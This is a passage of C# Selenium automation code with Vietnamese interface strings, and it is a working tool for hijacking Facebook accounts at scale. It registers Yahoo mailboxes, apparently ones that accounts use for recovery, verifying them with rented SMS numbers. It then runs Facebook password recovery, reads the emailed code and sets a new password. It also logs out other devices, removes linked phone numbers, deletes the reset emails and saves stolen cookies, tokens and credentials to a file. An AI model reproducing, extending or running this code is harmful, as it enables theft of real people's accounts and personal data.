                                                                chrome.FindElementById(idBtnRemove).Click();
                                                                Thread.Sleep(1500);
                                                                var cl = chrome.FindElementsByTagName("button").Where(x =>
                                                                {
                                                                    try
                                                                    {
                                                                        if (x.GetAttribute("class").Contains("layerConfirm"))
                                                                            return true;
                                                                        else
                                                                            return false;
                                                                    }
                                                                    catch
                                                                    {
                                                                        return false;
                                                                    };
                                                                }).ToList();
                                                                if (cl.Count > 0)
                                                                {
                                                                    cl[0].Click();
                                                                    Thread.Sleep(1500);
                                                                    try
                                                                    {
                                                                        chrome.FindElementById("ajax_password").SendKeys(passFacebook);
                                                                    }
                                                                    catch { }
                                                                    cl = chrome.FindElementsByTagName("button").Where(x =>
                                                                    {
                                                                        try
                                                                        {
                                                                            if (x.GetAttribute("class").Contains("layerConfirm"))
                                                                                return true;
                                                                            else
                                                                                return false;
                                                                        }
                                                                        catch
                                                                        {
                                                                            return false;
                                                                        };
                                                                    }).ToList();
                                                                    if (cl.Count > 0)
                                                                    {
                                                                        cl[0].Click();
                                                                        countDeletePhone++;
                                                                        Thread.Sleep(1500);
                                                                    }
                                                                }
                                                            }
                                                            tt = chrome.FindElementsByTagName("img").Where(x =>
                                                            {
                                                                try
                                                                {
                                                                    if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                                        return true;
                                                                    else
                                                                        return false;
                                                                }
                                                                catch
                                                                {
                                                                    return false;
                                                                };
                                                            }).ToList();
                                                            if (tt.Count <= 0)
                                                            {
                                                                isHavePhone = false;
                                                                break;
                                                            }
                                                        }
                                                        else
                                                        {
                                                            break;
                                                        }
                                                    } while (isHavePhone == true);
                                                }

                                                var cookies = chrome.Manage().Cookies.AllCookies;
                                                string cook = "";
                                                var session = chrome.Manage().Cookies.AllCookies.ToArray();
                                                foreach (OpenQA.Selenium.Cookie cookie in session)
                                                {
                                                    cook += cookie.Name + "=" + cookie.Value + ";";
                                                }
                                                if (ckbHideMail.Checked)
                                                {
                                                    ChangePryvacyMail(cook);
                                                }
                                                string token = "";
                                                if(checkBox1.Checked)
                                                    token= GetTokenBussinessFromCookie(cook); 
                                                File.AppendAllText("account//live.txt", uid + "|" + passFacebook + "|" + token + "|" + cook + "|" + email + "|" + passYahoo + "\r\n");
                                                LoadStatusGrid("Thành công!", "cStatusMail", i, 4, dtgvChangeVia);
                                                chrome.Quit();
                                            }
                                            else
                                            {
                                                LoadStatusGrid("Lỗi!", "cStatusMail", i, 2, dtgvChangeVia);
                                                chrome.Quit();
                                            }
                                        }
                                    }
                                    else
                                    {
                                        File.AppendAllText("account//nootp.txt", email + "|" + passFacebook + "|" + email + "|" + passYahoo + "\r\n");
                                        dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value = "Không nhận được OTP!";
                                    }
                                }
                            }
                            catch
                            {
                                LoadStatusGrid("Lỗi!", "cStatusMail", i, 2, dtgvChangeVia);
                                chrome.Quit();
                            }
                        }
                        catch
                        {
                            LoadStatusGrid("Lỗi!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                        }
                    }
                    else
                    {
                        LoadStatusGrid("Lỗi đăng kí!", "cStatusMail", i, 2, dtgvChangeVia);
                        chrome.Quit();
                    }
                }
                else if (email.EndsWith("@yahoo.com"))
                {
                    subemail = email.Replace("@yahoo.com", "");
                    string apiKey = txbApiKeySimthue.Text;

                    LoadStatusGrid("Đang tạo Mail...", "cStatusMail", i, 1, dtgvChangeVia);

                    ChromeOptions options = new ChromeOptions();
                    options.AddArguments("--disable-extensions"); // to disable extension
                    options.AddArguments("--disable-notifications"); // to disable notification
                    options.AddArgument("--window-size=700,700");
                    options.AddArgument("--window-position=0,0");
                    options.AddArgument("--blink-settings=imagesEnabled=false");
                    //options.AddArgument("--user-agent=" + userAgents[rd.Next(0, userAgents.Length)]);
                    if (ckbProfile.Checked)
                    {
                        if (uidIm != "")
                        {
                            string profilePath = @"profile/" + uidIm;
                            if (!Directory.Exists(profilePath))
                            {
                                Directory.CreateDirectory(profilePath);
                            }
                            options.AddArgument("--user-data-dir=" + profilePath);
                        }
                        else
                        {
                            LoadStatusGrid("Đang tạo Mail...", "cStatusMail", i, 2, dtgvChangeVia);
                            return;
                        }
                    }
                    if (ckbNoRegYahoo.Checked)
                    {
                        string profilePath = prof;
                        if (!Directory.Exists(profilePath))
                        {
                            Directory.CreateDirectory(profilePath);
                        }
                        options.AddArgument("--user-data-dir=" + profilePath);
                    }
                    ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                    service.HideCommandPromptWindow = true;
                    try
                    {
                        chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                    }
                    catch
                    {
                        LoadStatusGrid("Lỗi mở trình duyệt", "cStatusMail", i, 2, dtgvChangeVia);
                        return;
                    }
                    //chrome.Manage().Cookies.DeleteAllCookies();
                    chrome.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
                    chrome.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(120);
                    IJavaScriptExecutor js = chrome as IJavaScriptExecutor;
                    int timeStart = 0; string html = "";
                    if (ckbNoRegYahoo.Checked == false)
                    {
                        chrome.Navigate().GoToUrl("https://login.yahoo.com/account/create?intl=vn&lang=vi");
                        chrome.FindElementById("usernamereg-yid").SendKeys(subemail);
                        try
                        {
                            js.ExecuteScript("document.getElementsByName('shortCountryCode')[0].value=\"VN\";");
                        }
                        catch { }
                        chrome.FindElementById("usernamereg-firstName").SendKeys(TenVietNam());
                        chrome.FindElementById("usernamereg-lastName").SendKeys(HoVietNam());
                        //email input
                        ////pass
                        chrome.FindElementById("usernamereg-password").SendKeys(passYahoo);
                        //datebirth
                        js.ExecuteScript("document.getElementById('usernamereg-month').value=" + rd.Next(1, 12));
                        chrome.FindElementById("usernamereg-day").SendKeys("" + rd.Next(1, 29));
                        chrome.FindElementById("usernamereg-year").SendKeys("" + rd.Next(1990, 2000));
                        html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                        if (html.Contains("messages.IDENTIFIER"))
                        {
                            LoadStatusGrid("Mail tồn tại!", "cStatusMail", i, 1, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        LoadStatusGrid("Đang tạo SĐT...", "cStatusMail", i, 1, dtgvChangeVia);
                        #region Khai báo request
                        xNet.HttpRequest request = new xNet.HttpRequest();
                        request.KeepAlive = true;
                        request.Cookies = new CookieDictionary();
                        request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                        request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                        request.UserAgent = Http.ChromeUserAgent();
                        #endregion

                        string jsonCreate = request.Get("http://api.pvaonline.net/request/create?key=" + apiKey + "&service_id=29").ToString();
                        JObject objCreate = JObject.Parse(jsonCreate);
                        string idRequest = "", phone = "";
                        try
                        {
                            if (objCreate["success"].ToString().ToLower() == "true")
                            {
                                idRequest = objCreate["id"].ToString();
                            }
                            else
                            {
                                LoadStatusGrid("Lỗi API", "cStatusMail", i, 2, dtgvChangeVia);
                                chrome.Quit();
                                return;
                            }
                        }
                        catch
                        {
                            LoadStatusGrid("Lỗi API", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }

                        string jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + apiKey + "&id=" + idRequest).ToString();
                        JObject objRead = JObject.Parse(jsonRead);
                        timeStart = Environment.TickCount;
                        if (rdSimthue.Checked)
                        {
                            do
                            {
                                Thread.Sleep(5000);
                                if (Environment.TickCount - timeStart >= 95000)
                                {
                                    LoadStatusGrid("Lỗi Timeout!", "cStatusMail", i, 2, dtgvChangeVia);
                                    chrome.Quit();
                                    return;
                                }
                                try
                                {
                                    phone = objRead["number"].ToString();
                                    if (phone != "")
                                        phone = phone.Substring(2);
                                    else
                                    {
                                        jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + apiKey + "&id=" + idRequest).ToString();
                                        objRead = JObject.Parse(jsonRead);
                                    }
                                }
                                catch
                                {

                                }
                            } while (phone.Equals(""));
                        }

                        LoadStatusGrid("Tạo SĐT thành công!", "cStatusMail", i, 1, dtgvChangeVia);
                        //phone input
                        chrome.FindElementById("usernamereg-phone").SendKeys(phone);
                        chrome.FindElementById("reg-submit-button").Click();
                        bool isLoadDone = false;
                        timeStart = Environment.TickCount;
                        do
                        {
                            Thread.Sleep(1000);

                            //verify
                            Thread.Sleep(3000);
                            try
                            {
                                //chrome.FindElementByXPath("//button[@name='resendCode']").Click();
                                chrome.FindElementByName("sendCode").Click();
                                isLoadDone = true;
                            }
                            catch
                            {
                                try
                                {
                                    chrome.FindElementById("reg-submit-button").Click();
                                    isLoadDone = true;
                                }
                                catch { }
                            }
                            if (chrome.Url.Contains("fail"))
                            {
                                LoadStatusGrid("Sim dùng quá nhiều lần!", "cStatusMail", i, 2, dtgvChangeVia);
                                chrome.Quit();
                                return;
                            }
                            if (Environment.TickCount - timeStart >= 20000)
                            {
                                break;
                            }
                        } while (isLoadDone == false);

                        if (isLoadDone == false)
                        {
                            Thread.Sleep(1000);
                            if (chrome.Url.Contains("fail"))
                            {
                                LoadStatusGrid("Sim dùng quá nhiều lần!", "cStatusMail", i, 2, dtgvChangeVia);

                                chrome.Quit();
                                return;
                            }
                            LoadStatusGrid("Lỗi đăng kí!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        string smsCode = ""; bool isHaveCode = false;
                        LoadStatusGrid("Đang chờ OTP", "cStatusMail", i, 1, dtgvChangeVia);
                        bool isResend = false;
                        timeStart = Environment.TickCount;
                        if (rdSimthue.Checked)
                        {
                            do
                            {
                                Thread.Sleep(5000);
                                if (Environment.TickCount - timeStart >= 95000)
                                {
                                    LoadStatusGrid("Lỗi Timeout", "cStatusMail", i, 2, dtgvChangeVia);
                                    chrome.Quit();
                                    return;
                                }
                                if (isResend == false)
                                {
                                    try
                                    {
                                        chrome.FindElementByName("resendCode").Click();
                                        isResend = true;
                                    }
                                    catch
                                    {

                                    }
                                }

                                jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + apiKey + "&id=" + idRequest).ToString();
                                objRead = JObject.Parse(jsonRead);
                                try
                                {
                                    if (objRead["sms"].Count() > 0)
                                    {
                                        string data = objRead["sms"][0].ToString();
                                        smsCode = Regex.Match(data.Split('|')[2], "\\d{5}").Value;
                                        if (smsCode.Trim().Length != 5)
                                            continue;
                                        isHaveCode = true;
                                    }
                                }
                                catch
                                {

                                    LoadStatusGrid("Lỗi đọc OTP!", "cStatusMail", i, 2, dtgvChangeVia);
                                    chrome.Quit();
                                    return;
                                }
                            } while (isHaveCode == false);
                        }

                        Thread.Sleep(1000);

                        //chrome.FindElementById("verification-code-field").SendKeys(smsCode);
                        js.ExecuteScript("document.getElementById('verification-code-field').value=\"" + smsCode + "\";");
                        Thread.Sleep(500);
                        js.ExecuteScript("document.getElementsByName('verifyCode')[0].click();");
                        Thread.Sleep(6000);
                        chrome.Url = "https://mail.yahoo.com";
                        Thread.Sleep(3000);
                        if (chrome.Url.Contains("https://login.yahoo.com"))
                        {
                            LoadStatusGrid("Lỗi tạo mail!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        else if (chrome.Url.Contains("https://mail.yahoo.com/?guccounter"))
                        {
                            chrome.Navigate().Refresh();
                            Thread.Sleep(1000);
                        }
                        LoadStatusGrid("Tạo Mail thành công!", "cStatusMail", i, 1, dtgvChangeVia);
                        File.AppendAllText("account//yahoo.txt", email + "|" + passYahoo + "\r\n");
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        //
                        chrome.Navigate().GoToUrl("https://login.yahoo.com/");
                        try
                        {
                            chrome.FindElementById("login-username").Clear();
                        }
                        catch { }
                        chrome.FindElementById("login-username").SendKeys(accMailMain.Split('|')[0]);
                        Thread.Sleep(2000);
                        try
                        {
                            js.ExecuteScript("document.querySelector('#login-signin').click();");
                        }
                        catch
                        {
                            chrome.FindElementById("login-signin").Click();
                        }
                        Thread.Sleep(6000);
                        js.ExecuteScript("document.querySelector('#login-passwd').value='" + accMailMain.Split('|')[1] + "';");
                        Thread.Sleep(2000);
                        js.ExecuteScript("document.querySelector('#login-signin').click();");
                        Thread.Sleep(3500);
                        chrome.Url = "https://mail.yahoo.com";
                        if (chrome.Url.Contains("https://login.yahoo.com"))
                        {
                            LoadStatusGrid("Lỗi đăng nhập!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        else if (chrome.Url.Contains("https://mail.yahoo.com/?guccounter"))
                        {
                            chrome.Navigate().Refresh();
                            Thread.Sleep(1000);
                        }
                        LoadStatusGrid("Đăng nhập thành công", "cStatusMail", i, 1, dtgvChangeVia);
                        Thread.Sleep(5000);
                        try
                        {
                            chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[7]/div[1]/div[1]/div[1]/div[2]/button[1]").Click();
                            Thread.Sleep(1000);
                        }
                        catch { }
                        LoadStatusGrid("Đang thêm bí danh...", "cStatusMail", i, 2, dtgvChangeVia);
                        chrome.Url = "https://mail.yahoo.com/d/settings/1";
                        try
                        {
                            //if co bi danh
                            chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/section[1]/div[1]/article[1]/div[1]/div[1]/div[1]/div[2]/ul[1]/li[1]").Click();
                            Thread.Sleep(1000);
                            chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/section[1]/div[1]/article[1]/div[1]/div[2]/div[1]/div[1]/div[4]/button[1]").Click();
                            Thread.Sleep(2000);
                            chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[7]/div[1]/div[1]/div[1]/div[4]/button[1]").Click();
                            Thread.Sleep(5000);
                        }
                        catch { }
                        //try
                        //{
                        Thread.Sleep(2000);
                        chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/section[1]/div[1]/article[1]/div[1]/div[1]/div[1]/div[2]/div[3]/button[1]").Click();
                        Thread.Sleep(3500);
                        chrome.FindElementByName("accountEmail").SendKeys(email);
                        Thread.Sleep(3500);
                        chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/section[1]/div[1]/article[1]/div[1]/div[2]/div[1]/div[1]/div[3]/button[1]").Click();
                        Thread.Sleep(7000);

                        try
                        {
                            string afddf = chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/section[1]/div[1]/article[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[1]/span[1]").Text;
                            //MessageBox.Show(afddf);
                            LoadStatusGrid("Mail không đủ điều kiện!!!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        catch
                        {
                            LoadStatusGrid("Thêm bí danh thành công!!!", "cStatusMail", i, 2, dtgvChangeVia);

                        }
                        chrome.Url = "https://mail.yahoo.com/";
                        Thread.Sleep(2000);
                        //}
                        //catch(Exception ex)
                        //{
                        //    LoadStatusGrid("Lỗi thêm bí danh!!!", "cStatusMail", i, 2, dtgvChangeVia);
                        //    chrome.Quit();
                        //    return;
                        //}
                        //delete message
                        while (chrome.FindElementsByTagName("li").Where(x => { try { if (x.GetAttribute("role").Equals("rowgroup")) return true; else return false; } catch { return false; } }).ToList().Count() > 1)
                        {

                            try
                            {
                                var btnCheckAll = chrome.FindElementsByTagName("button").Where(x =>
                                {
                                    try
                                    {
                                        if (x.GetAttribute("tabindex").Equals("30"))
                                            return true;
                                        else
                                            return false;
                                    }
                                    catch
                                    {
                                        return false;
                                    };
                                }).ToList();
                                if (btnCheckAll.Count > 0)
                                {
                                    btnCheckAll[0].Click();
                                    Thread.Sleep(500);
                                    try
                                    {
                                        js.ExecuteScript("document.querySelector('#mail-app-component > div.W_6D6F.D_F > div > div.en_0 > div > div.D_F.em_N.gl_C > ul > li:nth-child(3) > div > button').click();");
                                    }
                                    catch { }
                                    Thread.Sleep(500);
                                    try
                                    {
                                        js.ExecuteScript("document.querySelector('#modal-outer > div > div > div:nth-child(4) > button.P_1EudUu.C_52qC.r_P.y_Z2uhb3X.A_6EqO.cvhIH6_T.ir3_1JO2M7.cZ11XJIl_0.k_w.e_dRA.D_X.M_6LEV.o_v.p_R.V_M.t_C.cZ1RN91d_n.u_e69.i_3qGKe.H_A.cn_dBP.cg_FJ.l_Z2aVTcY.j_n.S_n.S4_n.I_Z2aVTcY.I3_Z2bdAhD.l3_Z2bdIi1.I0_Z2bdAhD.l0_Z2bdIi1.I4_Z2bdAhD.l4_Z2bdIi1').click()");
                                        Thread.Sleep(5000);
                                    }
                                    catch { }
                                    chrome.Navigate().Refresh();
                                }
                            }
                            catch { }
                        };
                        Thread.Sleep(4000);
                        //chrome.Navigate().Refresh();
                        //Thread.Sleep(2000);
                    }

                    LoadStatusGrid("Đổi MK Facebook...", "cStatusMail", i, 1, dtgvChangeVia);
                    try
                    {
                        js.ExecuteScript("window.open();");
                    }
                    catch
                    {
                        chrome.FindElement(By.CssSelector("body")).SendKeys(OpenQA.Selenium.Keys.Control + "t");
                    }
                    Thread.Sleep(1500);
                    chrome.SwitchTo().Window(chrome.WindowHandles.Last());
                    chrome.Navigate().GoToUrl("https://www.facebook.com");
                    //js.ExecuteScript("javascript:void(function(){ function deleteAllCookiesFromCurrentDomain() { var cookies = document.cookie.split(\"; \"); for (var c = 0; c < cookies.length; c++) { var d = window.location.hostname.split(\".\"); while (d.length > 0) { var cookieBase = encodeURIComponent(cookies[c].split(\"; \")[0].split(\" = \")[0]) + '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; domain=' + d.join('.') + ' ;path='; var p = location.pathname.split('/'); document.cookie = cookieBase + '/'; while (p.length > 0) { document.cookie = cookieBase + p.join('/'); p.pop(); }; d.shift(); } } } deleteAllCookiesFromCurrentDomain();})();");
                    chrome.Manage().Cookies.DeleteAllCookies();
                    //change facebook
                    chrome.Navigate().GoToUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
                    chrome.FindElementById("identify_email").SendKeys(email);
                    Thread.Sleep(100);
                    chrome.FindElementByName("did_submit").Click();
                    Thread.Sleep(4000);
                    chrome.FindElementByName("reset_action").Click();

                    string resetPassOTP = ""; bool isFind = false;
                    Thread.Sleep(1500);
                    chrome.SwitchTo().Window(chrome.WindowHandles.First());
                    LoadStatusGrid("Chờ OTP Mail...", "cStatusMail", i, 1, dtgvChangeVia);
                    timeStart = Environment.TickCount;
                    do
                    {
                        if (Environment.TickCount - timeStart > 95000)
                        {
                            LoadStatusGrid("Lỗi Timeout", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        //chrome.Navigate().GoToUrl("https://mail.yahoo.com/d/folders/1/messages/" + indexMes);
                        Thread.Sleep(2000);

                        string htmlYahoo = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                        string itemRow = Regex.Match(htmlYahoo, @"message-subject(.*?)</span>", RegexOptions.Singleline).Value;
                        resetPassOTP = Regex.Match(itemRow, @"\d{6}", RegexOptions.Singleline).Value;
                        if (resetPassOTP != "")
                        {
                            isFind = true;
                            //delete
                            while (chrome.FindElementsByTagName("li").Where(x => { try { if (x.GetAttribute("role").Equals("rowgroup")) return true; else return false; } catch { return false; } }).ToList().Count() > 1)
                            {

                                try
                                {
                                    var btnCheckAll = chrome.FindElementsByTagName("button").Where(x =>
                                    {
                                        try
                                        {
                                            if (x.GetAttribute("tabindex").Equals("30"))
                                                return true;
                                            else
                                                return false;
                                        }
                                        catch
                                        {
                                            return false;
                                        };
                                    }).ToList();
                                    if (btnCheckAll.Count > 0)
                                    {
                                        btnCheckAll[0].Click();
                                        Thread.Sleep(500);
                                        try
                                        {
                                            js.ExecuteScript("document.querySelector('#mail-app-component > div.W_6D6F.D_F > div > div.en_0 > div > div.D_F.em_N.gl_C > ul > li:nth-child(3) > div > button').click();");
                                        }
                                        catch { }
                                        Thread.Sleep(500);
                                        try
                                        {
                                            js.ExecuteScript("document.querySelector('#modal-outer > div > div > div:nth-child(4) > button.P_1EudUu.C_52qC.r_P.y_Z2uhb3X.A_6EqO.cvhIH6_T.ir3_1JO2M7.cZ11XJIl_0.k_w.e_dRA.D_X.M_6LEV.o_v.p_R.V_M.t_C.cZ1RN91d_n.u_e69.i_3qGKe.H_A.cn_dBP.cg_FJ.l_Z2aVTcY.j_n.S_n.S4_n.I_Z2aVTcY.I3_Z2bdAhD.l3_Z2bdIi1.I0_Z2bdAhD.l0_Z2bdIi1.I4_Z2bdAhD.l4_Z2bdIi1').click()");
                                            Thread.Sleep(5000);
                                        }
                                        catch { }
                                        chrome.Navigate().Refresh();
                                    }
                                }
                                catch { }
                            }; ;
                            break;
                        }
                        chrome.Navigate().Refresh();
                    } while (isFind == false);

                    if (isFind)
                    {
                        chrome.SwitchTo().Window(chrome.WindowHandles.Last());
                        Thread.Sleep(200);

                        if (ckbChangePass.Checked)
                        {
                            LoadStatusGrid("Đổi mật khẩu Facebook...", "cStatusMail", i, 1, dtgvChangeVia);
                            Thread.Sleep(200);
                            chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                            Thread.Sleep(500);
                            chrome.FindElementByName("reset_action").Click();
                            Thread.Sleep(3000);
                            //change new pass
                            if (ckbExport.Checked)
                            {
                                File.AppendAllText("linkreset.txt", chrome.Url + Environment.NewLine);
                                LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                chrome.Quit();
                                return;
                            }
                            chrome.FindElementById("password_new").SendKeys(passFacebook);
                            try
                            {
                                chrome.FindElementById("btn_continue").Click();
                            }
                            catch
                            {

                            }
                        }
                        else
                        {
                            LoadStatusGrid("Đăng nhập Facebook...", "cStatusMail", i, 1, dtgvChangeVia);
                            chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                            Thread.Sleep(500);
                            chrome.FindElementByName("reset_action").Click();
                            Thread.Sleep(3000);
                            if (ckbExport.Checked)
                            {
                                File.AppendAllText("linkreset.txt", chrome.Url + Environment.NewLine);
                                LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                chrome.Quit();
                                return;
                            }
                            chrome.FindElementById("skip_button").Click();
                        }

                        Thread.Sleep(5000);
                        if (chrome.Url.Contains("checkpoint"))
                        {
                            chrome.FindElementById("checkpointSubmitButton").Click();
                            Thread.Sleep(10000);
                            string cpstt = "Checkpoint: ";
                            var listCp = chrome.FindElementsByName("verification_method").ToList();
                            if (listCp.Count > 0)
                            {
                                for (int c = 0; c < listCp.Count; c++)
                                {
                                    string a = listCp[c].GetAttribute("value");
                                    if (a == "3")
                                        cpstt += "-Ảnh-";
                                    else if (a == "2")
                                        cpstt += "-Ngày sinh-";
                                    else if (a == "20")
                                    {
                                        cpstt += "-Tin nhắn-";
                                    }
                                    else if (a == "4" || a == "34")
                                    {
                                        cpstt += "-Số Điện Thoại-";
                                    }
                                    else if (a == "14")
                                    {
                                        cpstt += "-CP Thiết bị-";
                                    }
                                    else if (a == "26")
                                    {
                                        cpstt += "-Nhờ bạn bè-";
                                    }
                                }
                            }
                            LoadStatusGrid(cpstt, "cStatusMail", i, 3, dtgvChangeVia);
                            File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                            if (ckbNoRegYahoo.Checked == true)
                            {
                                chrome.Manage().Cookies.DeleteAllCookies();
                            }
                            chrome.Quit();
                            return;
                        }
                        else
                        {
                            LoadStatusGrid("Đăng nhập thành công!!!", "cStatusMail", i, 1, dtgvChangeVia);

                            string uid = ""; bool isFindUid = false;

                            if (ckbChangePass.Checked == false)
                            {

                                chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=security&section=password&view");
                                Thread.Sleep(5000);
                                chrome.FindElementById("password_new").SendKeys(passFacebook);
                                chrome.FindElementById("password_confirm").SendKeys(passFacebook);
                                Thread.Sleep(5000);
                                chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[3]/div[1]/div[1]/div[2]/div[2]/div[2]/div[1]/div[1]/div[1]/div[1]/div[3]/div[2]/div[1]/div[1]/div[1]/div[1]/form[1]/div[1]/div[2]/div[1]/label[1]").Click();
                                Thread.Sleep(10000);
                                try
                                {
                                    chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[2]/div[3]/label[1]/input[1]").Click();
                                    Thread.Sleep(200);
                                    chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[3]/button[1]").Click();
                                }
                                catch { }
                                if (chrome.Url.Contains("checkpoint"))
                                {
                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                    Thread.Sleep(10000);
                                    string cpstt = "Checkpoint: ";
                                    var listCp = chrome.FindElementsByName("verification_method").ToList();
                                    if (listCp.Count > 0)
                                    {
                                        for (int c = 0; c < listCp.Count; c++)
                                        {
                                            string a = listCp[c].GetAttribute("value");
                                            if (a == "3")
                                                cpstt += "-Ảnh-";
                                            else if (a == "2")
                                                cpstt += "-Ngày sinh-";
                                            else if (a == "20")
                                            {
                                                cpstt += "-Tin nhắn-";
                                            }
                                            else if (a == "4" || a == "34")
                                            {
                                                cpstt += "-Số Điện Thoại-";
                                            }
                                            else if (a == "14")
                                            {
                                                cpstt += "-CP Thiết bị-";
                                            }
                                            else if (a == "26")
                                            {
                                                cpstt += "-Nhờ bạn bè-";
                                            }
                                        }
                                    }
                                    LoadStatusGrid(cpstt, "cStatusMail", i, 3, dtgvChangeVia);
                                    File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                    if (ckbNoRegYahoo.Checked == true)
                                    {
                                        chrome.Manage().Cookies.DeleteAllCookies();
                                    }
                                    chrome.Quit();
                                    return;
                                }
                            }
                            else
                            {
                                Thread.Sleep(10000);
                                try
                                {
                                    chrome.Url = "https://www.facebook.com";
                                    Thread.Sleep(2000);
                                    chrome.FindElementById("email").SendKeys(email);
                                    chrome.FindElementById("pass").SendKeys(passFacebook);
                                    Thread.Sleep(1000);
                                    chrome.FindElementById("loginbutton").Click();
                                    Thread.Sleep(10000);
                                    try
                                    {
                                        chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[2]/div[3]/label[1]/input[1]");
                                        Thread.Sleep(500);
                                        chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[3]/button[1]").Click();
                                    }
                                    catch { }
                                }
                                catch { }
                                if (chrome.Url.Contains("checkpoint"))
                                {
                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                    Thread.Sleep(10000);
                                    string cpstt = "Checkpoint: ";
                                    var listCp = chrome.FindElementsByName("verification_method").ToList();
                                    if (listCp.Count > 0)
                                    {
                                        for (int c = 0; c < listCp.Count; c++)
                                        {
                                            string a = listCp[c].GetAttribute("value");
                                            if (a == "3")
                                                cpstt += "-Ảnh-";
                                            else if (a == "2")
                                                cpstt += "-Ngày sinh-";
                                            else if (a == "20")
                                            {
                                                cpstt += "-Tin nhắn-";
                                            }
                                            else if (a == "4" || a == "34")
                                            {
                                                cpstt += "-Số Điện Thoại-";
                                            }
                                            else if (a == "14")
                                            {
                                                cpstt += "-CP Thiết bị-";
                                            }
                                            else if (a == "26")
                                            {
                                                cpstt += "-Nhờ bạn bè-";
                                            }
                                        }
                                    }
                                    LoadStatusGrid(cpstt, "cStatusMail", i, 3, dtgvChangeVia);
                                    File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                    if (ckbNoRegYahoo.Checked == true)
                                    {
                                        chrome.Manage().Cookies.DeleteAllCookies();
                                    }
                                    chrome.Quit();
                                    return;
                                }
                            }
                            if (ckbLogoutDevice.Checked)
                            {
                                if (!chrome.Url.Contains("password/change/reason/"))
                                {
                                    chrome.Url = "https://www.facebook.com/password/change/reason/";
                                }
                                LoadStatusGrid("Đăng xuất thiết bị...", "cStatusMail", i, 1, dtgvChangeVia);
                                try
                                {
                                    js.ExecuteScript("document.getElementById('u_0_3').click();");
                                    Thread.Sleep(500);
                                    var listbtn = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("value") == "1").ToList();
                                    if (listbtn.Count > 0)
                                    {
                                        for (int r = 0; r < listbtn.Count; r++)
                                        {
                                            if (listbtn[r].GetAttribute("class").Contains("selected"))
                                            {
                                                listbtn[r].Click();
                                                break;
                                            }
                                        }
                                    }
                                    Thread.Sleep(3000);
                                }
                                catch { }
                            }
                            chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                            var cc = chrome.Manage().Cookies.AllCookies.ToArray();
                            try
                            {
                                foreach (OpenQA.Selenium.Cookie cookie in cc)
                                {
                                    if (cookie.Name == "c_user")
                                    {
                                        uid = cookie.Value;
                                        isFindUid = true;
                                    }
                                }
                            }
                            catch { }

                            if (isFindUid == false)
                            {
                                chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                                Thread.Sleep(3000);
                                try
                                {
                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                }
                                catch { }
                                html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                uid = Regex.Match(html, "av=(.*?)\"").Groups[1].Value;
                            }
                            if (uid != "" && uid.Length < 25)
                            {
